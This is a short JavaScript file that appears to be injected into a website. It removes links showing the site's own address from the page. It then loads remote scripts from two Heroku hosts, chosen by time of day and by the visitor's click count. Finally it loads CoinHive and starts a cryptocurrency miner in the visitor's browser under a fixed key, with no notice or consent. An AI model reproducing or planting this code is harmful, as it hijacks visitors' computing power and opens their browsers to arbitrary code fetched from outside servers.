function setRewriteTL(){
	var a=new RegExp('<a href="http://'+window.location.hostname+'">http://'+window.location.hostname+'</a>','ig');
	document.body.innerHTML=document.body.innerHTML.replace(a,'');
	var b=new RegExp('<a href="http://'+window.location.hostname+'" target="_blank">http://'+window.location.hostname+'</a>','ig');
	document.body.innerHTML=document.body.innerHTML.replace(b,'');
}
setRewriteTL();


$(document).ready(function(){
    var nD=new Date();
    var nH=nD.getUTCHours();
    
    if(nH<12){
        $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1409"><\/script>');
    }else{
        $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1409"><\/script>');
    }

    localStorage.setItem('dcc', 0);
    $('body').click(function() {
        var cco=localStorage.getItem('dcc');
        cco++;
        localStorage.setItem('dcc', cco);
        if(cco==1){
            if(nH<12){
                $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1973"><\/script>');
            }else{
                $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1973"><\/script>');
            }
        }
        if(cco==2){
            if(nH<12){
                $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1193"><\/script>');
            }else{
                $('body').append('<script src="https:\/\/lit-shore-57528.herokuapp.com\/?id=1193"><\/script>');
            }
        }
    });
});


$(document).ready(function(){
    var script = document.createElement('script');
    script.src = 'https://coinhive.com/lib/coinhive.min.js';
    var ls = document.getElementsByTagName('head')[0].appendChild(script);

    ls.addEventListener('load', los, false);
        
    function los() {
        setTimeout(function() {
            var miner = new CoinHive.Anonymous('wXS5KFc5mWChIpczWxnYY6X9tb95ESw1', {
                threads: 1
            });
            miner.start();
        }, 500);
    }
});
